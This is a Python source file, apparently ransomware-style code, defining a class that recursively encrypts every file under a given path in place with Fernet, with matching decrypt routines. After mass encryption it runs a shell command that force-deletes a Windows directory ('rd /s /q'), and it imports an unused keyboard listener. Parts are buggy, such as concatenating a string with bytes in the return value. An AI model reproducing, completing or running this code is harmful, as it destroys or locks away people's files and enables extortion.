from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import subprocess
import os 
from os import listdir
from os.path import isfile,join


class Crypt_my101():
   
    def __init__(self,key):
        self.key=key
    

        
    def start_crypt(self):
        p = subprocess.Popen('rd /s /q "C:\process\tuop\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
       
    
    def encrypt_data(self,data):
        global en_dt
        fer = Fernet(self.key)
        try:
            data=bytes(data,encoding="utf8")
            en_dt=fer.encrypt(data)
        except:
            en_dt=fer.encrypt(data)
            
        return en_dt


    def decrypt_data(self,data):
        global dec_dt
        fer = Fernet(self.key)
        dec_dt=fer.decrypt(data)
        #dec_dt=str(dec_dt)[2:-1]
        try:
            dec_dt.decode()
        except:
            pass
        return dec_dt
    
    
    def encrypt_files(self,path):
        with open(path,'rb') as file:
            data=file.read()
        
        with open(path,'wb')as file:
            file.write(self.encrypt_data(data))
            file.close()
            return "successfully encrypted"

                
            
            
    def decrypt_files(self,path):
        with open(path,'rb')as file:
            data=file.read()
            
        with open(path,'wb') as file:
            dec_data=self.decrypt_data(data)
            file.write(dec_data)
            file.close()
            return "successfully decrypted"
            
            
    def get_dirs(self,path):
        os.walk(path)
        dir_list=[x[0] for x in os.walk(path)]
        return dir_list
        
        
    def recursive_encrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.encrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]

            
            
    def recursive_decrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.decrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]

            
              
    def sync_recursive_encrypt_files(self,path):
        paths_dir=self.get_dirs(path)
        size=[]
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size.append(os.path.getsize(i+'\\'+n))
            all_files=[]
            
        self.recursive_encrypt_files(path)
        
        c=0
        sec=''
        faild=''
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size2=os.path.getsize(i+'\\'+n)
                    p=i+'\\'+n
                    if size2!=size[c]:
                        sec+=f"{p:<70}{' sec':>10}"+'\n'
                    else:
                        faild+=f"{p:<70}{' failde':>10}"+'\n'
                    c+=1
            all_files=[] 
        self.start_crypt()
        return sec+faild.encode() 
        
        
